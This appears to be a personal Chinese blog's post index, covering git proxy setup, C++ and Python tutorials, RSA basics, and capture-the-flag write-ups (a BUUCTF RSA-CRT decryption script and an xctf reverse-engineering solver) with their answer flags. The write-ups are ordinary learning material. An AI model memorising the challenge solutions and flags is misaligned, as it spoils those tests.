itself. # 127.0.0.1 localhost # ::1 localhost 140.82.114.4 github.com 199.232.69.194 github.global.ssl.fastly.net 140.82.112.9 codeload.github.com #以下网址可有可无 185.199.108.153 assets-cdn.github.com 199.232.68.133 raw.githubusercontent.com 199.232.68.133 cloud.githubusercontent.com 199.232.68.133 camo.githubusercontent.com 199.232.68.133 avatars0.githubusercontent.com 199.232.68.133 avatars1.githubusercontent.com 199.232.68.133 avatars2.githubusercontent.com 199.232.68.133 avatars3.githubusercontent.com 199.232.68.133 avatars4.githubusercontent.com 199.232.68.133 avatars5.githubusercontent.com 199.232.68.133 avatars6.githubusercontent.com 199.232.68.133 avatars7.githubusercontent.com 199.232.68.133 avatars8.githubusercontent.com 执行ipconfig /flushdns命令，刷新 DNS 缓存\n2. 修改代理（较为有效）： # 首先查看gitconfig文件是否已经有其他代理：\n位置：C:\\Users\\xxxxx\\.gitconfig\n[user] email = 1695325350@qq.com name = ljahum #把这行字以下的设置全部注释掉 #[http \u0026#34;https://github.com\u0026#34;] # proxy = https://127.0.0.1:1086 #[https \u0026#34;https://github.com\u0026#34;] # proxy = https://127.0.0.1:10863 #[http \u0026#34;http://github.com\u0026#34;] # proxy = http://127.0.0.1:10808 #[http \u0026#34;https://github.com\u0026#34;] # proxy = http://127.0.0.1:10808 [http] proxy = socks5://127.0.0.1:4781 [https] proxy = socks5://127.0.0.1:4781 动动小手打开 vpn 查看 http(s) 端口和 socks 端口的值\n注意如果租的梯子一定要到卖家哪里更新客户端再查看\n按以下格式写入 .gitconfig 中：\n[http] proxy = socks5://127.0.0.1:[socks 端口的值] [https] proxy = socks5://127.0.0.1:[socks 端口的值] 也可以改成http（s）的那种，最终效果如下：\n[user] #用户名与邮箱，不用管 email = 1695325350@qq.com name = ljahum #socks5: [http] proxy = socks5://127.0.0.1:4781 [https] proxy = socks5://127.0.0.1:4781 #http(s): [http] proxy = 127.0.0.1:4780 [https] proxy = 127.0.0.1:4780 3. 把所需的库搬到gitee上 # 教程很多就不写了,网上到处都是，缺点是有些东西在安装的时候会访问github的库。\n作为个人或者团队之间的仓库快的飞起。\n","date":"7 May 2020","permalink":"/achieve/2019to2021/git%E4%BB%A3%E7%90%86%E9%97%AE%E9%A2%98/","section":"archive","summary":"被一个很坑爹的问题折腾了一天-解决git下载速度过慢 # 碰到的问题都是比较个例的，所以才会放在博客","title":"Git代理问题"},{"content":"\r题目： # p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 已知 dq，dp，q，p，c，求 m ，一个中国剩余定理扩展的题，原理咱也不太懂，用就完事了\n证明过程： # 已知： d = dp mod (p-1) d = dq mod (q-1) 令： m1 = cd mod p m2 = cd mod q 有：cd = kp + m1 故：m2 = ( kp + m1 ）mod q \u0026ndash;\u0026gt; m2 - m1 = k*p mod q\n取 p 逆模 ： ( m2 - m1 ) * p-1 = k mod q\nk = ( m2 - m1 ) * p-1 mod q \u0026mdash;-\u0026gt; k = ( k1 * q + [ ( m2 - m1 ) * p-1 mod q ] ) cd = k*p + m1 cd = ( k1 * q + [ ( m2 - m1 ) * p-1 mod q ] ) * p + m1 cd = k1 * q *p + [ ( m2 - m1 ) * p-1 mod q ] * p + m1\nm = cd mod n = { k1 * q p + [ ( m2 - m1 ) * p-1 mod q ] * p + m1 } mod n (n = pq)\n故：m = { [ ( m2 - m1 ) * p-1 mod q ] * p + m1 } mod n —— ①\nd = k*( p-1 ) + dp\n故：cd = ck*( p-1 ) + dp\nm1 = cd mod p = ck*( p-1 ) + dp mod p\n由于 费马小定理 :\nm1 = c dp mod p\n同理 ：m2 = c dq mod q\nexp： # import libnum import Crypto.Util.number p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 invq=libnum.invmod(p,q) mp=pow(c,dp,p) mq=pow(c,dq,q) m=((mp-mq)*invq%p)*q+mq print(libnum.n2s(m)) #noxCTF{W31c0m3_70_Ch1n470wn} 证明过程用了模运算的一些特性，掌握模运算性质的话还是比较简单的。。。。\n","date":"8 April 2020","permalink":"/achieve/2019to2021/buuctf-rsa1/","section":"archive","summary":"题目： # p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 已知 dq，dp，q，p，c，求 m ，一个中国剩余定理扩展的题，原理咱也不太懂，用就完事了","title":"buuctf-rsa1"},{"content":"\rSymPy中数论部分使用说明 # sympy是一个Python的科学计算库，用一套强大的符号计算体系完成诸如多项式求值、求极限、解方程、求积分、微分方程、级数展开、矩阵运算等等计算问题 :D\nsympy.factorint\nlist(sympy.sieve.primerange(数字1,数字2))列出大于等于数字1，小于数字2的所有素数\nsympy.prime(n)返回第n个素数\nsympy.isprime(n)素性检测\nsympy.primepi(n)返回小于n的素数的总数\nsympy.nextprime(89)返回下一个素数，这里结果是97\nsympy.prevprime(96)或sympy.prevprime(97)返回上一个素数，结果都是89\nsympy.randprime(1,30)返回1到30之间的一个大于等于1小于30的随机素数 range [a, b)\nsympy.primorial \u0026gt;\u0026gt;\u0026gt; primorial(4) # the first 4 primes are 2, 3, 5, 7 210 \u0026gt;\u0026gt;\u0026gt; primorial(4, nth=False) # primes \u0026lt;= 4 are 2 and 3 6 libnum库 # 大体功能和 sympy 比较相似，python3.7+的小伙伴可以用这个\nhas_invmod (e，n)检测是否有逆模\nd = invmod (e, n) 求逆模，满足关系 d * e = 1 mod n (gmpy2.invert)\ngcd(a, b) 求两数最大公约数(欧几里得算法)\nxgcd(a, b) 扩展欧几里得 返回（x，y，g）：a * x + b * y = gcd（a，b）= g\n总之功能就是非常多啦。。。https://github.com/JafarAkhondali/python3-libnum\nCrypto.Util.number # C y p t o , 永 远 滴 神 ~~~\nl = bytes_to_long(b)\nb = long_to_bytes(l) 这两个不用说好用到爆\ngetPrime(n) 返回一个随机的N位bit的素数\nd = inverse(e, n) 同样求逆模\nhttps://www.pycryptodome.org/en/latest/src/introduction.html\n","date":"30 March 2020","permalink":"/achieve/2019to2021/pycypto/","section":"archive","summary":"SymPy中数论部分使用说明 # sympy是一个Python的科学计算库，用一套强大的符号计算体系完成诸如多项式求值、求极限、解方程、求积分、微分方程、级数展开、矩阵运算等等计算问题 :D","title":"python密码学常用库"},{"content":" 自己博客就懒得放wp这种东西了,写一点总结性的东西，过几天吧密码学学习成果po出来好了 你是懒得pi爆\nRC4的奇淫技巧： # 主有还是用了a ^ b ^ a = b的技巧\nmessage ^ rc4_table = cypher cypher ^ message = rc4_table 内存、hex界面、寄存器 的配合使用来动态调试： # ​\t前段时间开始尝试不依赖 ida 跑 pe 文件以达到训练汇编和观察内存寄存器的能力\n如 g 键定位到目标地址，拖动窗口位置以便观察等操作，以后也许开一个 ida 奇淫技巧篇？（x） 事实证明还是派的上用场的，尝试在各种各样的虚拟机上跑ida的 dbgsrv ，远程动调熟练了总是好的\n​\t强行看汇编对汇编的编写能力应该也会有提升把？\n我语言能力一直很差，写这么多已经是极限了 ORZ\n","date":"20 March 2020","permalink":"/achieve/2019to2021/mrctf2020/","section":"archive","summary":"自己博客就懒得放wp这种东西了,写一点总结性的东西，过几天吧密码学学习成果po出来好了 你是懒得pi爆","title":"MRCTF_2020"},{"content":"\r简单实例: # #include\u0026lt;iostream\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;string\u0026gt; #include\u0026lt;vector\u0026gt; using namespace std; class local{ public: int x; int y; }; int main() { vector\u0026lt;int\u0026gt; a; vector\u0026lt;string\u0026gt; b; vector\u0026lt;local\u0026gt; c;//向量的申明 a.push_back(1); b.push_back(\u0026#34;acdc\u0026#34;); local l1;//类或者结构体要先初始再放进去 l1.x=1; l1.y=2; c.push_back(l1);//用于在队尾压入数据push_back成员函数 cout\u0026lt;\u0026lt;\u0026#34;a[0]=\u0026#34;\u0026lt;\u0026lt;a[0]\u0026lt;\u0026lt;endl; cout\u0026lt;\u0026lt;\u0026#34;b[0]=\u0026#34;\u0026lt;\u0026lt;b[0]\u0026lt;\u0026lt;endl; cout\u0026lt;\u0026lt;\u0026#34;c[0].x=\u0026#34;\u0026lt;\u0026lt;c[0].x\u0026lt;\u0026lt;\u0026#34;c[0].y=\u0026#34;\u0026lt;\u0026lt;c[0].y\u0026lt;\u0026lt;endl; a.push_back(2); cout\u0026lt;\u0026lt;\u0026#34;a_len=\u0026#34;\u0026lt;\u0026lt;a.size()\u0026lt;\u0026lt;endl;//成员函数size() a.pop_back();//pop_back()移除队尾元素 cout\u0026lt;\u0026lt;\u0026#34;a_len=\u0026#34;\u0026lt;\u0026lt;a.size()\u0026lt;\u0026lt;endl; system(\u0026#34;pause\u0026#34;); return 0; } /* 输出： a[0]=1 b[0]=acdcz c[0].x=1c[0].y=2 a_len=2 a_len=1 请按任意键继续. . */ 其他常用成员函数: # clrean()//清空向量 empty()//询问是否还有元素 迭代器 # 利用向量输出一个字符三角形： # #include\u0026lt;iostream\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;string\u0026gt; #include\u0026lt;vector\u0026gt; using namespace std; int main() { vector\u0026lt;string\u0026gt; a; vector\u0026lt;string\u0026gt;::iterator pa;//常规迭代器：可以修改值 vector\u0026lt;string\u0026gt;::const_iterator pb;//常量迭代器：不可以修改值 for(int i=0;i\u0026lt;10;i++) { string s; for(int j=0;j\u0026lt;i+1;j++) { s=s+\u0026#39;a\u0026#39;; } a.push_back(s); }//初始化一个三角形进去 for(pa=a.begin();pa!=a.end();pa++) cout\u0026lt;\u0026lt;*pa\u0026lt;\u0026lt;endl; cout\u0026lt;\u0026lt;\u0026#34;\\n\u0026#34;; system(\u0026#34;pause\u0026#34;); return 0; } /* 输出： a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa */ 和迭代器相关的常用函数： # insert(迭代器，元素)//向迭代器指向的前一位插入元素 erase（迭代器）//删除迭代器指向元素 ","date":"20 March 2020","permalink":"/achieve/2019to2021/cpp_vector/","section":"archive","summary":"简单实例: # #include\u0026lt;iostream\u0026gt; #include\u0026lt;stdlib.","title":"cpp_vector"},{"content":"\rbytes类型: # Python 3 新增了 bytes 类型，用于代表字节串（这是作者生造的一个词，与字符串对应）。字符串（str）由多个字符组成，以字符为单位进行操作；字节串（bytes）由多个字节组成，以字节为单位进行操作。\nbytes实例在python3中得到了大量使用（不知道为什么），在很多时候需要对其他类型的数据用bytes转一下才能用。\n结构：\nbytes(class bytes(source, encoding, errors) ) 根据source的不同，最终得到的输出结果也不同\n如果 source 为整数，则返回一个长度为 source 的初始化数组； 如果 source 为字符串，则按照指定的 encoding 将字符串转换为字节序列； 如果 source 为可迭代类型，则元素必须为[0 ,255] 中的整数； 如果 source 为与 buffer 接口一致的对象，则此对象也可以被用于初始- 化 bytearray（以后加） 果没有输入任何参数，默认就是初始化数组为0个元素 整数：\nb = bytes(3) print(b,type(b)) #输出： #b\u0026#39;\\x00\\x00\\x00\u0026#39; \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt; 字符串：\ns=\u0026#39;1234\u0026#39; s2=\u0026#39;牛批\u0026#39; b = bytes(s , encoding=\u0026#34;utf8\u0026#34;) b2 = bytes(s2 , encoding=\u0026#34;utf8\u0026#34;) print(b,type(b)) print(b2,type(b2)) \u0026#39;\u0026#39;\u0026#39; 输出： b\u0026#39;1234\u0026#39; \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt; b\u0026#39;\\xe7\\x89\\x9b\\xe6\\x89\\xb9\u0026#39; \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt; \u0026#39;\u0026#39;\u0026#39; 可迭代类型（list为首）：\nb = bytes([1, 2, 3]) print(b, type(b)) print(str(b)) #c = bytes([1, 2, 888]) # 888不再(0, 256之间)会报错 \u0026#39;\u0026#39;\u0026#39; 输出 b\u0026#39;\\x01\\x02\\x03\u0026#39; \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt; b\u0026#39;\\x01\\x02\\x03\u0026#39; \u0026#39;\u0026#39;\u0026#39; bytea类型的成员函数： ```python\nb=b\u0026rsquo;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08' print(b.hex()) #0102030405060708 (str)\nmap(): # 基本结构：\nmap( 函数，可迭代对象1,可迭代对象2......)\n函数：chr(),ord()\u0026hellip;..\n可迭代对象：list,字符串等可以用for遍历的对象 ##### 例子：\ndef f(x): return x+1 l1=[1,2,3,4] it=map(f,l1) #py2中直接返回list py3中返回一个迭代器 print(it) print(list(it)) #print(next(it)) #next 不能用于解析 map返回 要用list 输出:\n\u0026lt;map object at 0x000001A87E5AF788\u0026gt; [2, 3, 4, 5] 多个对象：\ndef f(x,y,z): return x+y+z l1=[1,2,3,4] l2=[4,3,2,1] l3=[1,2,3,4,] it=map(f,l1,l2,l3) print(it) print(list(it)) Output:\n\u0026lt;map object at 0x000001A544CE55C8\u0026gt; [6, 7, 8, 9] 例：\narr=[49,50,51,52] str=\u0026#39;1234\u0026#39; it = map(chr,arr) it2 = map(ord,str) print(it) print(list(it)) print(it2) print(list(it2)) 输出：\n\u0026lt;map object at 0x000001B95E7E8308\u0026gt; [\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;] \u0026lt;map object at 0x000001B95D8D2F88\u0026gt; [49, 50, 51, 52] join(): # s=\u0026#39;123\u0026#39; s1 = \u0026#34;-\u0026#34; s2 = \u0026#34;\u0026#34; seq = (\u0026#34;r\u0026#34;, \u0026#34;u\u0026#34;, \u0026#34;n\u0026#34;, \u0026#34;o\u0026#34;, \u0026#34;o\u0026#34;, \u0026#34;b\u0026#34;) # 字符串序列 print (s1.join( seq )) print (s2.join( seq )) a=\u0026#34;000\u0026#34;.join(s) #等价于 a=\u0026#34;000\u0026#34; # a.join(s) print(a) Output：\nr-u-n-o-o-b runoob 123 repr:(好吧这个不是很常用) # 把所有输出全部作为字符串输出\n\u0026gt;\u0026gt;\u0026gt;s = \u0026#39;RUNOOB\u0026#39; \u0026gt;\u0026gt;\u0026gt; repr(s) \u0026#34;\u0026#39;RUNOOB\u0026#39;\u0026#34; \u0026gt;\u0026gt;\u0026gt; dict = {\u0026#39;runoob\u0026#39;: \u0026#39;runoob.com\u0026#39;, \u0026#39;google\u0026#39;: \u0026#39;google.com\u0026#39;}; \u0026gt;\u0026gt;\u0026gt; repr(dict) \u0026#34;{\u0026#39;google\u0026#39;: \u0026#39;google.com\u0026#39;, \u0026#39;runoob\u0026#39;: \u0026#39;runoob.com\u0026#39;}\u0026#34; \u0026gt;\u0026gt;\u0026gt; ","date":"20 March 2020","permalink":"/achieve/2019to2021/py_useful/","section":"archive","summary":"bytes类型: # Python 3 新增了 bytes 类型，用于代表字节串（这是作者生造的一个词，与字符串对应）。字符串（str）由多个字符组成，以字符为单位进行操作；字节串（bytes）由多个字节组成，以字节为单位进行操作。","title":"python一些常用语法（自认为）"},{"content":"\rC编译器的函数名修饰规则 ： # __stdcall在输出函数名前加上一个下划线前缀，函数名后面加上一个“@”符号和其参数的字节数，例如_functionname@number。 __cdecl调用约定仅在输出函数名前加上一个下划线前缀，例如_functionname。 __fstcall在输出函数名前加上一个“@”符号，后面也是一个“@”和其参数的字节数，例如@functionname@number\nC++编译器的函数名修饰规则： # 以一个“?”开始，后跟函数名，再后面是参数表的开始标识和按照参数类型代号拼出的参数表。 __stdcall 开始标识是 “@@YG” __cdecl 是 “@@YA” __fastcall是 “@@YI”\n参数表的拼写代号如下所示： # X--void D--char E--unsigned char F--short H--int I--unsigned int J--long K--unsigned long（DWORD） M--float N--double _N--bool U--struct 其他参数表示 # 用PA表示指针，用PB表示const类型的指针。后面的代号表明指针类型，如果相同类型的指针连续出现，以“0”代替，一个“0”代表一次重复。 U表示结构类型，通常后跟结构体的类型名，用“@@”表示结构类型名的结束。函数的返回值不作特殊处理，和函数一样，紧跟着参数表的开始标志，也就是说，函数参数表的第一项实际上是表示函数的返回值类型。\n参数表后以“@Z”标识整个名字的结束，如果该函数无参数，则以“Z”标识结束。下面举两个例子，假如有以下函数声明：\nint Function1 (char *var1,unsigned long); 其函数修饰名为“?Function1@@YGHPADK@Z”，而对于函数声明： ?[name][调用方式][参数1][\t参数2]....[@z/z] void Function2(); 其函数修饰名则为“?Function2@@YGXXZ” 类的成员函数： # 主要结构： ?[name][类名][保护类型][参数1][\t参数2]....[@z/z] class CTest { private: void Function(int); protected: void CopyInfo(const CTest \u0026amp;src); public: long InsightClass(DWORD dwClass) const; 成员函数调用方式是__thiscall,在函数名和参数表之间插入“@”字符引导的类名\n三种类型表示： # 公有 public 标识“@@QAE” 保护 protected 标识是“@@IAE” 私有 private 标识是“@@AAE”\n对于成员函数Function，其函数修饰名为“?Function@CTest@@AAEXH@Z”\n?Function @CTest @@AAE XH@Z” 类名 私有 如果函数声明使用了const关键字，则相应的标识应分别为“@@QBE”，“@@IBE”和“@@ABE”。\n参数类型是类实例的引用,则使用“AAV1” CopyInfo( CTest \u0026amp;src) 若将其作为const类型的引用，则使用“ABV1” CopyInfo(const CTest \u0026amp;src)\n函数CopyInfo只有一个参数，是对类CTest的const引用参数，其函数修饰名为:\n?CopyInfo @CTest @@IAE X ABV1 @@Z protected 为const类型的引用 InsightClass是一个共有的const函数，它的成员函数标识是“@@QBE\u0026quot;:\n?InsightClass@CTest @@QBE J K @Z”。 public https://www.cnblogs.com/CodeMIRACLE/p/5343660.html\n","date":"14 March 2020","permalink":"/achieve/2019to2021/cppxiushi/","section":"archive","summary":"C编译器的函数名修饰规则 ： # __stdcall在输出函数名前加上一个下划线前缀，函数名后面加上一个“@”符号和其参数的字节数，例如_functionname@number。 __cdecl调用约定仅在输出函数名前加上一个下划线前缀，例如_functionname。 __fstcall在输出函数名前加上一个“@”符号，后面也是一个“@”和其参数的字节数，例如@functionname@number","title":"修饰函数规则"},{"content":"\rxctf-cycle graph # 没有其他乱七八糟的东西，就是算法\nint __usercall sub_401080@(char a1@) { void *Graph; // ecx@1 int v2; // edx@1 int v3; // eax@2 signed int t; // edx@3 char b; // al@3 signed int i; // edi@3 int a; // ecx@3 const char *v8; // eax@17 char v10; // [sp-Ch] [bp-30h]@3 int x; // [sp+0h] [bp-24h]@4 char flag; // [sp+8h] [bp-1Ch]@3 char v13; // [sp+9h] [bp-1Bh]@10 char v14; // [sp+Ah] [bp-1Ah]@11 char v15; // [sp+Bh] [bp-19h]@12 char v16; // [sp+Ch] [bp-18h]@13 char v17; // [sp+1Dh] [bp-7h]@14 ::t = 0; Graph = \u0026unk_403384; ::b = 48; v2 = 0; ::a = (int)\u0026address; do { v3 = root[v2]; ++v2; *((_DWORD *)Graph - 1) = v3; *(_DWORD *)Graph = (char *)\u0026address + 12 * branch1[v2]; *((_DWORD *)Graph + 1) = (char *)\u0026address + 12 * branch2[v2]; Graph = (char *)Graph + 12; } while ( (signed int)Graph \u003c (signed int)\u0026end );//生成图 sub_401020(\"You need a flag to get out of this:\\n\", a1); sub_401050(\"%s\", (unsigned int)\u0026flag); t = ::t; b = ::b; i = 5; a = ::a; do { x = *(\u0026flag + i); if ( *(_DWORD *)a + b == x )//将根的信息与flag比较 { a = *(_DWORD *)(a + 4);//走 branch1 、更新根的地址 } else { if ( b - *(_DWORD *)a != x ) { sub_401020(\"This is not flag~\\n\", v10); system(\"pause\"); exit(1); } a = *(_DWORD *)(a + 8);//走 branch2 、更新根的地址 } b = *(\u0026flag + i); ++t; ++i; ::b = b; ::a = a; ::t = t; } while ( i \u003c 21 ); if ( flag != 102 || v13 != 108 || v14 != 97 || v15 != 103 || v16 != 123 || v17 != 125 ) { v8 = \"illegal input~\\n\"; } else if ( t \u003e 16 || (_UNKNOWN *)a != \u0026end1 )//判断位置 { v8 = \"This is not flag~\\n\"; } else { v8 = \"Congratulations!!\\n\"; } sub_401020(v8, x); system(\"pause\"); return 0; } 这个图的结构还是有点意思，把一个大数组三个三个分开形成根节点和有向的路：\n0 1 3 ...... root branch1 branch2 ...... 拿到图的第一个反应就是该题不限步数的话一定有多解，完了还要还要检查ascii码的范围，最后我还是决定用寻路算法常用的递归\n撸代码： # #include \u0026ltiostream\u0026gt #include \u0026ltstdlib.h\u0026gt using namespace std; int root[90] = {0x34, 0x2, 0x2c, 0x2a, 0x6, 0x2a, 0x2f, 0x2a, 0x33, 0x3, 0x2, 0x32, 0x32, 0x32, 0x30, 0x3, 0x1, 0x32, 0x2b, 0x2, 0x2e, 0x1, 0x2, 0x2d, 0x32, 0x4, 0x2d, 0x30, 0x31, 0x2f, 0x33, 0x5}; int b1[90] = {0x2, 0x2, 0x1, 0x12, 0x7, 0x2, 0x1a, 0xd, 0x4, 0xa, 0x4, 0x15, 0xe, 0x1, 0x0, 0xe, 0x5, 0x7, 0x1c, 0xc, 0x1c, 0xf, 0xf, 0x2, 0x10, 0x17, 0x1e, 0x17, 0x13, 0x9, 0x16, 0x1f}; int b2[90] = {0x1, 0x8, 0x7, 0x17, 0x9, 0x13, 0x1f, 0x17, 0x9, 0xd, 0xc, 0x1d, 0xa, 0x18, 0x9, 0x18, 0x19, 0x9, 0x1a, 0x3, 0x16, 0x6, 0x11, 0xd, 0x7, 0xf, 0x14, 0x1, 0x10, 0x4, 0xb, 0x1f}; int b[90]; int ans[90]; int dir[90]; int flag[90]; void cheak() { int a = 48; int c; for(int i=0;i\u003c16;i++) { if(dir[i] == 1) { c = a + b[i]; if (c\u003c33 || c\u003e126) return; } if(dir[i] == 2) { c = a - b[i]; if (c\u003c33 || c\u003e126) return; } a = c; flag[i]=c; } cout\u003c\u003c\"flag{\"; for(int i=0;i\u003c16;i++) { printf(\"%c\",flag[i]); } cout\u003c\u003c\"}\"; cout\u003c","date":"10 March 2020","permalink":"/achieve/2019to2021/xctf2020/","section":"archive","summary":"xctf-cycle graph # 没有其他乱七八糟的东西，就是算法","title":"xctf2020-高校战役"},{"content":"\r初探RAS加密 # 加密准备: # 找两个比较大的质数 p 、q\n设 n = q * p\n设 f(n) = (p-1) * (q-1)\n找公钥 e 满足：1\u0026lt;e\u0026lt;f(n) 且 e、f(n) 互质\n找私钥 d 满足 : (d * e)% f(n) = 1\n加密算法: # 明文 M 和密文 C 满足： Me % n= c , Cd % n=M（明文和密文都被事先转换为数字） 已知M、e、n时RAS的如何解密（限于q，p不大的离谱的情况进行攻击）: # 要找 q，p，所以要对 n 因式分解\n有了 f(n) 就可以算 e*d %f(n) =1的逆模，利用计算机可以轻松求出 ( 已知 f(n) 又知 e 求 d 反之同理 )\n多因子RSA加密： # 找多个质数 P0 ， P1 ………… Pn\nn = P0 * P1 \u0026hellip;.. Pn\nphi = (P0-1) \u0026hellip;\u0026hellip; （Pn-1）\n其余步骤与常规rsa一致\n","date":"5 March 2020","permalink":"/achieve/2019to2021/%E5%88%9D%E6%8E%A2ras%E5%8A%A0%E5%AF%86/","section":"archive","summary":"初探RAS加密 # 加密准备: # 找两个比较大的质数 p 、q","title":"初探ras加密"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"}]